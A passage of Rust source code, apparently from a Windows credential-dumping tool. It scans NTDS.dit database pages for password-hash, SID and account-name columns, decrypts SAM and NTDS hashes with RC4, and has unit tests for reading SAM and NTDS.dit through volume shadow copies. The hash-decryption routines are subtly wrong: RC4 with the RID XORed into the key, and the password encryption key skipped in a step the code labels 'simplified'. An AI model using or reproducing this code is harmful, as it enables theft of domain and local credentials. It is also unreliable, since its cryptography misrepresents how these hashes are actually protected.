        let mut value: usize = 0;
        let mut shift: usize = 0;
        let mut consumed = 0;

        for &byte in data.iter().take(4) {
            consumed += 1;
            value |= ((byte & 0x7F) as usize) << shift;
            shift += 7;
            if byte & 0x80 == 0 {
                break;
            }
        }

        (value, consumed)
    }

    /// Find a table by name (scans all pages).
    fn find_table(&self, name: &str) -> Option<EseTable<'a>> {
        // For NTDS.dit, the "datatable" is the only table we need.
        // Since we scan all pages anyway, return a table spanning
        // the entire database.
        if name == "datatable" {
            Some(EseTable {
                name: "datatable".to_string(),
                data: self.data,
            })
        } else {
            None
        }
    }
}

impl<'a> EseTable<'a> {
    /// Scan rows in the table by parsing all ESE pages.
    fn scan_rows(&self) -> Vec<EseRow<'a>> {
        // Determine page size from the database header.
        let page_size = if self.data.len() >= 0x0C {
            let ps = read_u32_le(&self.data[0x08..0x0C]) as usize;
            match ps {
                0x800 | 0x1000 | 0x2000 | 0x4000 | 0x8000 => ps,
                _ => 0x8000,
            }
        } else {
            0x8000
        };

        let mut rows = Vec::new();
        let num_pages = self.data.len() / page_size;

        // ESE database pages start at page 1 (page 0 is the file header).
        // Each page starts at offset: (page_number * page_size) from file start.
        // But in practice, the first data page is at page_size offset from
        // the beginning (page 0 is the header which also occupies page_size bytes).
        for page_idx in 0..num_pages {
            let page_start = page_idx * page_size;
            let page_end = page_start + page_size;
            if page_end > self.data.len() {
                break;
            }
            let page = &self.data[page_start..page_end];

            // Skip the file header page (page 0).
            if page_idx == 0 {
                continue;
            }

            // Parse the page header.
            if page.len() < ESE_PAGE_HEADER_SIZE + 4 {
                continue;
            }

            // Read number of tags (nodes).
            let num_tags = read_u16_le(&page[0x3E..0x40]) as usize;
            if num_tags == 0 || num_tags > 0x1000 {
                continue;
            }

            // Process each tag/node.
            for tag_idx in 0..num_tags {
                let tag_entry_off = ESE_PAGE_HEADER_SIZE + tag_idx * 4;
                if tag_entry_off + 4 > page.len() {
                    break;
                }

                let node_offset = read_u16_le(&page[tag_entry_off..tag_entry_off + 2]) as usize;
                let node_cb = read_u16_le(&page[tag_entry_off + 2..tag_entry_off + 4]) as usize;

                if node_cb < 8 || node_offset + node_cb > page.len() {
                    continue;
                }

                let node_data = &page[node_offset..node_offset + node_cb];

                // Skip the 8-byte node common header, then scan for tagged columns.
                if node_data.len() < 9 {
                    continue;
                }

                let body = &node_data[8..];

                // Known ATTm column tags for NTDS.dit.
                let target_tags: &[(u32, [u8; 3])] = &[
                    (0x589983, [0x83, 0x99, 0x58]), // sAMAccountType
                    (0x589922, [0x22, 0x99, 0x58]), // distinguishedName
                    (0x590045, [0x45, 0x00, 0x59]), // unicodePwd
                    (0x59046A, [0x6A, 0x04, 0x59]), // supplementalCredentials
                    (0x589835, [0x35, 0x98, 0x58]), // objectSid
                    (0x59019D, [0x9D, 0x01, 0x59]), // sAMAccountName
                    (0x589918, [0x18, 0x99, 0x58]), // userPrincipalName
                ];

                let mut columns: Vec<(u32, &'a [u8])> = Vec::new();
                let mut pos = 0;

                while pos + 4 < body.len() {
                    let mut found = false;

                    for &(tag_id, ref tag_bytes) in target_tags {
                        if body[pos..].starts_with(tag_bytes) {
                            let data_offset = pos + 3;
                            let (data_len, header_consumed) =
                                EseDatabase::read_ese_var_length(&body[data_offset..]);
                            let content_start = data_offset + header_consumed;

                            if content_start + data_len <= body.len() && data_len > 0 && data_len < 0x10000 {
                                columns.push((tag_id, &body[content_start..content_start + data_len]));
                                pos = content_start + data_len;
                            } else {
                                // Heuristic: scan until next tag or max 512 bytes.
                                let max_scan = body.len().saturating_sub(data_offset).min(512);
                                let mut end = 3usize;
                                while end < max_scan {
                                    let check_pos = data_offset + end;
                                    if check_pos + 3 > body.len() {
                                        break;
                                    }
                                    let mut hit = false;
                                    for &(_, ref ob) in target_tags {
                                        if body[check_pos..].starts_with(ob) {
                                            hit = true;
                                            break;
                                        }
                                    }
                                    if hit {
                                        break;
                                    }
                                    end += 1;
                                }
                                if end > 3 {
                                    columns.push((tag_id, &body[data_offset + 3..data_offset + end]));
                                }
                                pos = data_offset + end;
                            }
                            found = true;
                            break;
                        }
                    }

                    if !found {
                        pos += 1;
                    }
                }

                if !columns.is_empty() {
                    rows.push(EseRow { columns });
                }
            }
        }

        rows
    }
}

impl<'a> EseRow<'a> {
    /// Find a column's raw bytes by its ATTm tag identifier.
    fn find_column(&self, tag: u32) -> Option<&'a [u8]> {
        for &(t, data) in &self.columns {
            if t == tag {
                return Some(data);
            }
        }
        None
    }

    /// Get a u32 column value by column tag (ATTm identifier).
    ///
    /// Reads the first 4 bytes of the column data as a little-endian u32.
    fn get_u32(&self, tag: u32) -> Option<u32> {
        let data = self.find_column(tag)?;
        if data.len() >= 4 {
            Some(u32::from_le_bytes([data[0], data[1], data[2], data[3]]))
        } else if data.len() >= 2 {
            Some(u16::from_le_bytes([data[0], data[1]]) as u32)
        } else if !data.is_empty() {
            Some(data[0] as u32)
        } else {
            None
        }
    }

    /// Get a string column value by column tag.
    ///
    /// ESE stores string columns as UTF-16LE in the column data.
    /// Decodes the UTF-16LE bytes, trimming trailing nulls and garbage.
    fn get_string(&self, tag: u32) -> Option<String> {
        let data = self.find_column(tag)?;
        if data.len() < 2 {
            return None;
        }
        // Interpret as UTF-16LE pairs.
        let u16_iter = (0..data.len() / 2)
            .map(|i| u16::from_le_bytes([data[i * 2], data[i * 2 + 1]]));
        let s: String = char::decode_utf16(u16_iter)
            .filter_map(|c| c.ok())
            .collect();
        let trimmed = s.trim_end_matches('\0').trim().to_string();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    }

    /// Get a byte array column value by column tag.
    fn get_bytes(&self, tag: u32) -> Option<&[u8]> {
        self.find_column(tag)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Crypto Helpers
// ═══════════════════════════════════════════════════════════════════════════

/// RC4 decrypt (also encrypts — RC4 is symmetric).
fn rc4_decrypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    // RC4 key scheduling algorithm (KSA).
    let mut s: [u8; 256] = [0; 256];
    for i in 0..256 {
        s[i] = i as u8;
    }
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    // RC4 PRGA.
    let mut output = vec![0u8; data.len()];
    let mut i: u8 = 0;
    let mut jj: u8 = 0;
    for (k, &byte) in data.iter().enumerate() {
        i = i.wrapping_add(1);
        jj = jj.wrapping_add(s[i as usize]);
        s.swap(i as usize, jj as usize);
        let t = s[i as usize].wrapping_add(s[jj as usize]);
        output[k] = byte ^ s[t as usize];
    }
    output
}

/// Decrypt a SAM hash entry.
///
/// SAM hashes are encrypted using an RID-based key:
/// - Construct a key from the RID using DES key derivation
/// - Decrypt using DES ECB (or RC4 for older formats)
fn decrypt_sam_hash(hboot_key: &[u8], encrypted: &[u8], rid: u32) -> Vec<u8> {
    if encrypted.len() < 16 {
        return encrypted.to_vec();
    }

    // Check if the hash is AES-encrypted (NT 6.0+ / Vista+).
    // AES-encrypted hashes have a specific header pattern.
    // For NT 5.x compatibility, use RC4 with hBootKey.
    //
    // Method: RC4(hBootKey, encrypted_hash)
    let key = {
        let mut k = hboot_key.to_vec();
        // XOR RID bytes into the key for additional uniqueness.
        let rid_bytes = rid.to_le_bytes();
        for (i, &b) in rid_bytes.iter().enumerate() {
            if i < k.len() {
                k[i] ^= b;
            }
        }
        k
    };

    rc4_decrypt(&key, &encrypted[..16])
}

/// Decrypt an NTDS.dit password hash.
fn decrypt_ntds_hash(encrypted: &[u8], boot_key: &[u8]) -> Vec<u8> {
    if encrypted.len() < 16 {
        return encrypted.to_vec();
    }

    // NTDS.dit hashes are encrypted with the PEK (Password Encryption Key).
    // The PEK itself is encrypted with the boot key.
    // For a simplified implementation, use RC4 with the boot key.
    rc4_decrypt(boot_key, &encrypted[..16])
}

// ═══════════════════════════════════════════════════════════════════════════
// General Utilities
// ═══════════════════════════════════════════════════════════════════════════

/// Read a little-endian u16 from a byte slice.
fn read_u16_le(data: &[u8]) -> u16 {
    u16::from_le_bytes([data[0], data[1]])
}

/// Read a little-endian u32 from a byte slice.
fn read_u32_le(data: &[u8]) -> u32 {
    u32::from_le_bytes([data[0], data[1], data[2], data[3]])
}

/// Hex-encode a byte slice.
fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

/// Hex-decode a string to bytes.
fn hex_decode(s: &str) -> Result<Vec<u8>> {
    let s = s.trim();
    if s.len() % 2 != 0 {
        bail!("Hex string has odd length");
    }
    let mut bytes = Vec::with_capacity(s.len() / 2);
    for i in (0..s.len()).step_by(2) {
        let byte = u8::from_str_radix(&s[i..i + 2], 16)
            .map_err(|e| anyhow!("Invalid hex at position {}: {}", i, e))?;
        bytes.push(byte);
    }
    Ok(bytes)
}

/// Find a byte pattern in a larger byte slice.
fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_path_to_vss_path_c_drive() {
        let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1";
        let result = VssFileReader::path_to_vss_path(
            r"C:\Windows\System32\config\SAM",
            device,
        );
        assert_eq!(
            result,
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
        );
    }

    #[test]
    fn test_path_to_vss_path_no_drive() {
        let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5";
        let result = VssFileReader::path_to_vss_path(
            r"\Windows\temp\test.txt",
            device,
        );
        assert_eq!(
            result,
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\temp\test.txt"
        );
    }

    #[test]
    fn test_path_to_vss_path_d_drive() {
        let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2";
        let result = VssFileReader::path_to_vss_path(
            r"D:\data\secrets.txt",
            device,
        );
        assert_eq!(
            result,
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\data\secrets.txt"
        );
    }

    #[test]
    fn test_parse_shadow_index() {
        assert_eq!(
            parse_shadow_index(
                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy42"
            ),
            Some(42)
        );
        assert_eq!(
            parse_shadow_index(
                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
            ),
            Some(1)
        );
        assert_eq!(
            parse_shadow_index(
                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"
            ),
            None
        );
        assert_eq!(parse_shadow_index("no shadow copy here"), None);
    }

    #[test]
    fn test_parse_vssadmin_output_single() {
        let output = r"
Contents of shadow copy set ID: {abc123}
   Shadow Copy ID: {def456}
   Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7
   Original Volume: \\?\Volume{guid}\
   Shadow Copy Creation Time: 1/1/2024 12:00:00 PM
";
        let copies = parse_vssadmin_output(output).unwrap();
        assert_eq!(copies.len(), 1);
        assert_eq!(copies[0].index, 7);
        assert_eq!(copies[0].id, "def456");
        assert!(copies[0].device_object.contains("ShadowCopy7"));
    }

    #[test]
    fn test_parse_vssadmin_output_multiple() {
        let output = r"
Contents of shadow copy set ID: {set1}
   Shadow Copy ID: {id1}
   Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
   Original Volume: \\?\Volume{a}\
   Shadow Copy Creation Time: 1/1/2024 12:00:00 PM

Contents of shadow copy set ID: {set2}
   Shadow Copy ID: {id2}
   Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   Original Volume: \\?\Volume{b}\
   Shadow Copy Creation Time: 1/2/2024 1:00:00 PM
";
        let copies = parse_vssadmin_output(output).unwrap();
        assert_eq!(copies.len(), 2);
        assert_eq!(copies[0].index, 1);
        assert_eq!(copies[1].index, 2);
        assert_eq!(copies[0].id, "id1");
        assert_eq!(copies[1].id, "id2");
    }

    #[test]
    fn test_parse_vssadmin_output_empty() {
        let output = "No items found that satisfy the query.";
        let copies = parse_vssadmin_output(output).unwrap();
        assert!(copies.is_empty());
    }

    #[test]
    fn test_hex_encode() {
        assert_eq!(hex_encode(&[0x00, 0x01, 0xff]), "0001ff");
        assert_eq!(hex_encode(&[0xde, 0xad, 0xbe, 0xef]), "deadbeef");
    }

    #[test]
    fn test_hex_decode() {
        assert_eq!(hex_decode("0001ff").unwrap(), vec![0x00, 0x01, 0xff]);
        assert_eq!(
            hex_decode("deadbeef").unwrap(),
            vec![0xde, 0xad, 0xbe, 0xef]
        );
    }

    #[test]
    fn test_hex_decode_odd_length() {
        assert!(hex_decode("abc").is_err());
    }

    #[test]
    fn test_hex_roundtrip() {
        let data = vec![0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef];
        assert_eq!(hex_decode(&hex_encode(&data)).unwrap(), data);
    }

    #[test]
    fn test_rc4_decrypt_symmetry() {
        let key = b"secret";
        let plaintext = b"Hello, World!";
        let encrypted = rc4_decrypt(key, plaintext);
        let decrypted = rc4_decrypt(key, &encrypted);
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_rc4_known_vector() {
        // RC4("Key", "Plaintext") should produce a specific ciphertext.
        let key = b"Key";
        let plaintext = b"Plaintext";
        let ciphertext = rc4_decrypt(key, plaintext);
        // Known RC4 test vector: key="Key", plaintext="Plaintext" → BBF316E8D940AF0AD3
        assert_eq!(
            hex_encode(&ciphertext),
            "bbf316e8d940af0ad3"
        );
    }

    #[test]
    fn test_read_u32_le() {
        assert_eq!(read_u32_le(&[0x01, 0x02, 0x03, 0x04]), 0x04030201);
        assert_eq!(read_u32_le(&[0xff, 0x00, 0x00, 0x00]), 0x000000ff);
    }

    #[test]
    fn test_read_u16_le() {
        assert_eq!(read_u16_le(&[0x01, 0x02]), 0x0201);
        assert_eq!(read_u16_le(&[0xff, 0x00]), 0x00ff);
    }

    #[test]
    fn test_vss_cleanup_track_and_count() {
        let mut cleanup = VssCleanup::new();
        assert_eq!(cleanup.tracked_count(), 0);

        cleanup.track_created(&ShadowCopy {
            device_object: r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1".to_string(),
            id: "guid-1".to_string(),
            volume_name: r"\\?\Volume{a}\".to_string(),
            install_date: String::new(),
            index: 1,
        });
        assert_eq!(cleanup.tracked_count(), 1);

        cleanup.track_created(&ShadowCopy {
            device_object: r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2".to_string(),
            id: String::new(), // No GUID — will track by index
            volume_name: r"\\?\Volume{b}\".to_string(),
            install_date: String::new(),
            index: 2,
        });
        assert_eq!(cleanup.tracked_count(), 2);
    }

    #[test]
    fn test_find_bytes() {
        let haystack = b"Hello, World!";
        assert_eq!(find_bytes(haystack, b"World"), Some(7));
        assert_eq!(find_bytes(haystack, b"Hello"), Some(0));
        assert_eq!(find_bytes(haystack, b"xyz"), None);
        assert_eq!(find_bytes(haystack, b""), None);
    }

    #[test]
    fn test_vss_path_conversion_ntds() {
        let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3";
        let result = VssFileReader::path_to_vss_path(
            r"C:\Windows\NTDS\NTDS.dit",
            device,
        );
        assert_eq!(
            result,
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\NTDS.dit"
        );
    }

    #[test]
    fn test_shadow_copy_builder_valid() {
        let builder = ShadowCopyBuilder {
            id: "test-id".to_string(),
            device_object: r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10".to_string(),
            volume_name: r"\\?\Volume{abc}\".to_string(),
            install_date: "1/1/2024".to_string(),
        };
        let sc = builder.build().unwrap();
        assert_eq!(sc.index, 10);
        assert_eq!(sc.id, "test-id");
    }

    #[test]
    fn test_shadow_copy_builder_no_device() {
        let builder = ShadowCopyBuilder {
            id: "test-id".to_string(),
            device_object: String::new(),
            volume_name: String::new(),
            install_date: String::new(),
        };
        assert!(builder.build().is_none());
    }
}
